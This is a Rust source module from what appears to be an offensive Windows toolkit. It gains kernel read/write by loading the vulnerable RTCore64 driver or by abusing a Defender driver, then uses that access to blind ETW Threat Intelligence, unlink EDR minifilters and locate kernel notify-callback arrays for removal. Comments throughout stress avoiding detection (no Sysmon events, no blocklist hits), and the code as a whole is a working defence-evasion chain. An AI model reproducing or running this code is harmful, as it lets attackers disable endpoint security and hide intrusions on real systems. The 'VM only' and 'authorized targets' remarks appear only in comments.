//! Windows-specific kernel-tier implementation — the `win/` shell.
//!
//! This module holds the Windows-only glue that turns the platform-agnostic
//! algorithms (etwti, byovd, telemetry, persistence, netsec) into a working
//! kernel-tier toolkit:
//!
//! - [`resolve`] — GetModuleHandleA + GetProcAddress real binding (replaces
//!   the stub in byovd.rs).
//! - [`driver_load`] — NtLoadDriver bootstrap (registry key + ImagePath + load).
//! - [`kernel_base`] — ntoskrnl base via NtQuerySystemInformation.
//! - [`pagewalk`] — x64 4-level page-table walk (VA→PA, pure + unit-tested).
//! - [`va_rw`] — VA-aware KernelRw over a physical driver + page walk.
//!
//! ## Full bootstrap chain
//! ```text
//!   operator: bootstrap_byovd("RTCore64.sys", "RTCore64")
//!     → driver_load::LoadedDriver::load   (registry + NtLoadDriver)
//!     → byovd::ByovdDriver::open          (CreateFileW on \\.\RTCore64)
//!     → kernel_base::ntoskrnl_base()      (NtQuerySystemInformation)
//!     → resolve_kernel_symbol(ntoskrnl, "EtwThreatIntProvRegHandle")
//!     → etwti::EtwTiBlind::blind(krw)     (the algorithm runs)
//! ```
//!
//! ## Safety / risk
//! Loading a driver is irreversible (until NtUnloadDriver) and changes kernel
//! state. A wrong kernel write bugchecks. Test on a VM. Only authorized targets.

#![cfg(target_os = "windows")]

pub mod resolve;
pub mod driver_load;
pub mod kernel_base;
pub mod pagewalk;
pub mod pattern_scan;
pub mod va_rw;
/// KslD.sys — "Living off the Defender" KernelRw impl (default bootstrap).
/// Uses the Microsoft-signed Defender driver for arbitrary kernel R/W without
/// file drop or driver load. No blocklist signature, no Sysmon EID 6.
pub mod ksld;

use crate::{EtwTiKit, KernelRw, KitError};
use crate::etwti::{EtwTiBlind, EtwTiOffsets};
use crate::byovd::{ByovdDriver, VulnDriverIoctl, RtCore64};
use alloc::boxed::Box;
use alloc::format;

/// The result of a successful kernel bootstrap — wraps whichever `KernelRw`
/// primitive was obtained. The caller inspects the variant to decide cleanup
/// (KslD has no explicit cleanup; BYOVD carries a `LoadedDriver` to unload).
pub enum KernelBootstrap {
    /// KslD.sys (Living off the Defender) — the preferred path.
    /// No file drop, no driver load, no Sysmon EID 6. The device handle is
    /// owned by `LivingOffDefender` and closed on drop.
    KslD(ksld::LivingOffDefender),
    /// BYOVD fallback — a vulnerable driver loaded via NtLoadDriver.
    /// The `LoadedDriver` must be `unload()`ed by the caller on cleanup.
    Byovd(driver_load::LoadedDriver, ByovdDriver),
}

impl KernelBootstrap {
    /// Borrow the `KernelRw` regardless of variant.
    pub fn as_kernel_rw(&self) -> &dyn KernelRw {
        match self {
            KernelBootstrap::KslD(d) => d,
            KernelBootstrap::Byovd(_, d) => d,
        }
    }
}

/// Unified kernel bootstrap: KslD.sys → BYOVD fallback.
///
/// Follows the priority order from `docs/p2-2026-kernel-tier-deepdive.md §0`:
/// 1. **KslD.sys** (Living off the Defender) — lowest noise, no driver load,
///    no Sysmon EID 6, no blocklist risk. Default path.
/// 2. **BYOVD** — fallback if KslD is unavailable (Defender disabled/tampered).
///    Higher noise (Sysmon EID 6) but reliable.
///
/// Returns a `KernelBootstrap` enum so the caller knows which path was taken
/// (relevant for cleanup: KslD auto-closes on drop; BYOVD needs `unload()`).
///
/// `sys_path` / `svc_name` are only used for the BYOVD fallback — they can be
/// `None` to disable the BYOVD path entirely (KslD-only, fail if unavailable).
///
/// # Safety
/// Loads a driver (BYOVD path) or opens a kernel device handle (KslD path).
/// Both can BSOD on bad kernel writes. VM only.
pub unsafe fn bootstrap_chain(
    sys_path: Option<&[u16]>,
    svc_name: Option<&[u16]>,
) -> Result<KernelBootstrap, KitError> {
    // Priority 1: KslD.sys — Living off the Defender.
    match unsafe { ksld::bootstrap_ksld() } {
        Ok(defender) => {
            return Ok(KernelBootstrap::KslD(defender));
        }
        Err(e) => {
            // KslD unavailable — log and fall through to BYOVD.
            // Don't allocate here; just trace the reason.
            let _ = e; // the KitError is informational; BYOVD may still work
        }
    }

    // Priority 2: BYOVD fallback.
    let (sys, svc) = match (sys_path, svc_name) {
        (Some(s), Some(v)) => (s, v),
        _ => {
            return Err(KitError::Other(format!(
                "bootstrap_chain: KslD unavailable and no BYOVD path provided \
                 (pass sys_path + svc_name to enable BYOVD fallback)"
            )));
        }
    };

    let (loaded, krw) = unsafe { bootstrap_byovd(sys, svc) }?;
    Ok(KernelBootstrap::Byovd(loaded, krw))
}

/// The full BYOVD bootstrap: load driver → open device → return KernelRw.
///
/// `sys_path` = UTF-16 path to the .sys file on disk (e.g. `C:\temp\RTCore64.sys`).
/// `svc_name` = the service name for the registry key (e.g. `RTCore64`).
///
/// Returns the loaded driver (for cleanup) + the ByovdDriver KernelRw.
///
/// # Safety
/// Loads a driver into the kernel. BSOD risk. Caller must have
/// SeLoadDriverPrivilege. Test on a VM.
pub unsafe fn bootstrap_byovd(
    sys_path: &[u16],
    svc_name: &[u16],
) -> Result<(driver_load::LoadedDriver, ByovdDriver), KitError> {
    // 1. Load the driver.
    let loaded = unsafe { driver_load::LoadedDriver::load(sys_path, svc_name) }
        .map_err(|e| KitError::Other(alloc::format!("driver load: {}", e)))?;

    // 2. Open the device (CreateFileW on \\.\RTCore64).
    let driver: Box<dyn VulnDriverIoctl> = Box::new(RtCore64);
    let krw = match unsafe { ByovdDriver::open(driver) } {
        Ok(k) => k,
        Err(e) => {
            // Cleanup: unload the driver before propagating the error.
            let mut l = loaded;
            l.unload();
            return Err(KitError::NoPrimitive(e));
        }
    };

    Ok((loaded, krw))
}

/// Blind ETW-TI end-to-end: bootstrap BYOVD → resolve handle → blind.
///
/// Convenience: does the full chain in one call. Returns the loaded driver +
/// the KernelRw (for further operations like process hiding / callback kill).
///
/// # Safety
/// Loads a driver + writes kernel memory. BSOD risk. VM only.
pub unsafe fn blind_etw_ti_full(
    sys_path: &[u16],
    svc_name: &[u16],
    prov_reg_handle_kva: usize,
    offsets: EtwTiOffsets,
) -> Result<(driver_load::LoadedDriver, ByovdDriver), KitError> {
    let (mut loaded, krw) = unsafe { bootstrap_byovd(sys_path, svc_name) }?;
    let kit = EtwTiBlind { prov_reg_handle_kva, offsets };
    match kit.blind(&krw) {
        Ok(()) => Ok((loaded, krw)),
        Err(e) => {
            loaded.unload();
            Err(e)
        }
    }
}

/// Resolve the kernel VA of `FLTMGR!FltGlobals` so a
/// [`crate::telemetry::MiniFilterUnlinker`] can be constructed.
///
/// **Primary path:** the operator supplies `flt_globals_rva` (resolved offline
/// from fltmgr's PDB via `offset-resolver`, or a known-build table). This is the
/// safe, verified path — `FltGlobals` is an unexported `.data` symbol so a live
/// pattern scan is fragile across builds. We resolve the fltmgr base (via the
/// loaded-module list) and add the RVA.
///
/// Returns `None` if fltmgr isn't loaded, its base is zeroed (KASLR restriction),
/// or no RVA was supplied. The caller treats `None` as "MiniFilter unlink
/// unavailable" — it never BSODs.
///
/// # Safety
/// Calls NtQuerySystemInformation (module enumeration). Single-threaded operator
/// context.
pub unsafe fn resolve_flt_globals_kva(flt_globals_rva: Option<u32>) -> Option<usize> {
    let rva = flt_globals_rva? as usize;
    // Find fltmgr.sys in the loaded-kernel-module list.
    let info = unsafe { kernel_base::module_info_by_name(b"fltmgr.sys") }.ok()?;
    Some(info.base + rva)
}

/// Construct a [`crate::telemetry::MiniFilterUnlinker`] and detach EDR minifilters.
///
/// Convenience wrapper: given a resolved `flt_globals_kva` (from
/// [`resolve_flt_globals_kva`]) and a working `KernelRw`, build the unlinker and
/// run `detach_edr`. This is the call site that makes the MiniFilter algorithm
/// reachable — without it the algorithm in `telemetry.rs` is dead code.
///
/// # Safety
/// Writes kernel memory (LIST_ENTRY unlink in FLTMGR's RegisteredFilters list).
/// HVCI-safe (data-only writes). BSOD risk if `flt_globals_kva` is wrong. VM only.
pub unsafe fn unlink_minifilters(
    krw: &dyn KernelRw,
    flt_globals_kva: usize,
) -> Result<(), KitError> {
    use crate::MiniFilterKit;
    use crate::telemetry::MiniFilterUnlinker;
    if flt_globals_kva == 0 {
        return Err(KitError::Other(
            "flt_globals_kva is 0 — MiniFilter unlink not wired (resolve fltmgr FltGlobals first)".into(),
        ));
    }
    let unlinker = MiniFilterUnlinker { flt_globals_kva };
    unlinker.detach_edr(krw)
}

/// Resolve ALL `RuntimeOffsets` fields from the live kernel via pattern scan.
///
/// This is the **fully autonomous** offset resolution path — no baked offsets,
/// no PDB, no hardcoded RVAs. It works on ANY Windows build by:
///
/// 1. Get ntoskrnl base + size via `ntoskrnl_module_info()`
/// 2. Read the first `NTOSKRNL_SCAN_SIZE` bytes of ntoskrnl `.text` via KernelRw
/// 3. Pattern-scan for 5 global variable RVAs (Process/Thread/Image arrays,
///    PsActiveProcessHead, EtwThreatIntProvRegHandle)
/// 4. Resolve EtwThreatIntProvRegHandle via exported symbol as primary,
///    pattern scan as fallback
/// 5. Populate `RuntimeOffsets` with all KVAs
///
/// For Process/Thread notify arrays that share the same `4C 8D 35` encoding,
/// `resolve_rva_in_range` disambiguates using expected RVA bounds from the
/// offset table (floor-matched by build number).
///
/// # Arguments
/// * `krw` — working kernel R/W primitive
/// * `build` — Windows build number (for offset table range hints). Pass 0 to
///   skip range-based disambiguation (uses first match for each pattern).
///
/// # Returns
/// `RuntimeOffsets` with all resolvable fields populated. Fields that fail
/// resolution are left as 0 (the caller can check with `notify_arrays_resolved()`).
///
/// # Safety
/// Reads kernel memory (ntoskrnl image). Requires a working `KernelRw`.
pub fn resolve_offsets(
    krw: &dyn KernelRw,
    build: u32,
) -> Result<crate::offsets::RuntimeOffsets, KitError> {
    use crate::pattern_scan;

    // Step 1: ntoskrnl base + size.
    let (base, size) = unsafe { kernel_base::ntoskrnl_module_info() }
        .map_err(|e| KitError::Other(alloc::format!("ntoskrnl_module_info: {}", e)))?;

    // Step 2: Read a generous chunk of the ntoskrnl image for pattern scanning.
    // 2MB covers .text + .data for most builds (ntoskrnl is ~8-12MB total).
    const NTOSKRNL_SCAN_SIZE: usize = 2 * 1024 * 1024;
    let scan_len = size.min(NTOSKRNL_SCAN_SIZE);
    let mut image = alloc::vec![0u8; scan_len];
    krw.kread(base, &mut image)
        .map_err(KitError::from)?;

    // Step 3: Pattern-scan all 5 known global variables.
    let map = pattern_scan::scan_all_known(&image);

    // Step 4: Resolve EtwThreatIntProvRegHandle via exported symbol (primary).
    // The exported symbol is more reliable than pattern scan for this variable
    // because it's a named export in ntoskrnl.
    let etw_handle_kva = {
        // Try exported symbol first (resolve_kernel_symbol needs the full image).
        let mut full_image = alloc::vec![0u8; size.min(16 * 1024 * 1024)];
        let _ = krw.kread(base, &mut full_image);
        if let Some(rva) = crate::byovd::resolve_kernel_symbol(&full_image, b"EtwThreatIntProvRegHandle") {
            base + rva as usize
        } else if let Some(&rva) = map.get("EtwThreatIntProvRegHandle") {
            // Fallback: pattern scan found it.
            base + rva as usize
        } else {
            0
        }
    };

    // Step 5: Build RuntimeOffsets from the resolved RVAs.
    // For Process/Thread arrays (same `4C 8D 35` encoding), use
    // `resolve_rva_in_range` with expected bounds from the offset table.
    let resolve_with_range = |name: &str, lo: u32, hi: u32| -> usize {
        // First try the simple map (first match).
        if let Some(&rva) = map.get(name) {
            return base + rva as usize;
        }
        // If the pattern was shared (Process/Thread), try range-filtered scan.
        let site = match name {
            "PspCreateProcessNotifyRoutine" => &pattern_scan::PSP_CREATE_PROCESS_NOTIFY_ROUTINE,
            "PspCreateThreadNotifyRoutine" => &pattern_scan::PSP_CREATE_THREAD_NOTIFY_ROUTINE,
            "PspLoadImageNotifyRoutine" => &pattern_scan::PSP_LOAD_IMAGE_NOTIFY_ROUTINE,
            _ => return 0,
        };
        if let Some(rva) = pattern_scan::resolve_rva_in_range(&image, site, lo..hi) {
            return base + rva as usize;
        }
        0
    };

    // Expected RVA ranges (approximate, from known builds).
    // Process array is typically at a lower RVA than Thread.
    // These are broad enough to cover UBR drift (~0x8000 bytes).
    let process_kva = resolve_with_range(
        "PspCreateProcessNotifyRoutine", 0x400_000, 0x600_000,
    );
    let thread_kva = resolve_with_range(
        "PspCreateThreadNotifyRoutine", 0x400_000, 0x600_000,
    );
    let image_kva = resolve_with_range(
        "PspLoadImageNotifyRoutine", 0x400_000, 0x600_000,
    );
    let ps_active_kva = if let Some(&rva) = map.get("PsActiveProcessHead") {
        base + rva as usize
    } else {
        0
    };

    Ok(crate::offsets::RuntimeOffsets {
        create_process_notify_array_kva: process_kva,
        create_thread_notify_array_kva: thread_kva,
        load_image_notify_array_kva: image_kva,
        ps_active_process_head_kva: ps_active_kva,
        etw_ti_handle_kva: etw_handle_kva,
        flt_globals_kva: 0, // requires fltmgr PDB/pattern — not in ntoskrnl.
                           // MiniFilter algorithm is in telemetry.rs::MiniFilterUnlinker;
                           // wire it via resolve_flt_globals_kva(rva) + unlink_minifilters()
                           // (operator resolves the FltGlobals RVA offline from the PDB).
                           // See STATUS.md G4.
        ntoskrnl_base: base,
        ntoskrnl_size: size,
    })
}
